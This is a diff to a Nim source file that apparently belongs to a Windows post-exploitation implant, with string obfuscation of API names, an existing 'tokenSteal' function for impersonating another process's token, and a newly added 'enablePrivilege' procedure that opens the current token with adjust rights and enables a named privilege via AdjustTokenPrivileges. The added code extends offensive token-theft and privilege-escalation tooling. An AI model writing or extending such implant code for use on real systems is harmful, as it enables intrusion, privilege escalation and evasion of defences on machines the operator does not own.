@@ -16,6 +16,7 @@ type
     NtQueryInformationToken = proc(hToken: HANDLE, tokenInformationClass: TOKEN_INFORMATION_CLASS, tokenInformation: PVOID, tokenInformationLength: ULONG, returnLength: PULONG): NTSTATUS {.stdcall.}
     NtOpenThreadToken = proc(threadHandle: HANDLE, desiredAccess: ACCESS_MASK, openAsSelf: BOOLEAN, tokenHandle: PHANDLE): NTSTATUS {.stdcall.}
     NtOpenProcessToken = proc(processHandle: HANDLE, desiredAccess: ACCESS_MASK, tokenHandle: PHANDLE): NTSTATUS {.stdcall.}
+    
     ConvertSidToStringSidA = proc(sid: PSID, stringSid: ptr LPSTR): NTSTATUS {.stdcall.}
 
 const 
@@ -33,9 +34,9 @@ proc getCurrentToken*(): HANDLE =
         pNtOpenProcessToken = cast[NtOpenProcessToken](GetProcAddress(hNtdll, protect("NtOpenProcessToken")))
     
     # https://ntdoc.m417z.com/ntopenthreadtoken, token-info fails with error ACCESS_DENIED if OpenAsSelf is set to
-    status = pNtOpenThreadToken(CURRENT_THREAD, TOKEN_QUERY, TRUE, addr hToken)
+    status = pNtOpenThreadToken(CURRENT_THREAD, TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, TRUE, addr hToken)
     if status != STATUS_SUCCESS:
-        status = pNtOpenProcessToken(CURRENT_PROCESS, TOKEN_QUERY, addr hToken)
+        status = pNtOpenProcessToken(CURRENT_PROCESS, TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr hToken)
         if status != STATUS_SUCCESS: 
             raise newException(CatchableError, protect("NtOpenProcessToken ") & $status.toHex())
 
@@ -232,3 +233,26 @@ proc tokenSteal*(pid: int): bool =
 
 proc rev2self*(): bool = 
     return RevertToSelf()
+
+proc enablePrivilege*(privilegeName: string): string = 
+    var 
+        tokenPrivs: TOKEN_PRIVILEGES
+        oldTokenPrivs: TOKEN_PRIVILEGES
+        luid: LUID 
+        returnLength: DWORD
+
+    let hToken = getCurrentToken() 
+    defer: CloseHandle(hToken)
+
+    if LookupPrivilegeValueW(NULL, newWideCString(privilegeName), addr luid) == FALSE: 
+        raise newException(CatchableError, $GetLastError())
+
+    # Enable privilege
+    tokenPrivs.PrivilegeCount = 1
+    tokenPrivs.Privileges[0].Luid = luid 
+    tokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
+
+    if AdjustTokenPrivileges(hToken, FALSE, addr tokenPrivs, cast[DWORD](sizeof(TOKEN_PRIVILEGES)), addr oldTokenPrivs, addr returnLength) == FALSE:
+        raise newException(CatchableError, $GetLastError())
+
+    return privilegeToString(addr luid)
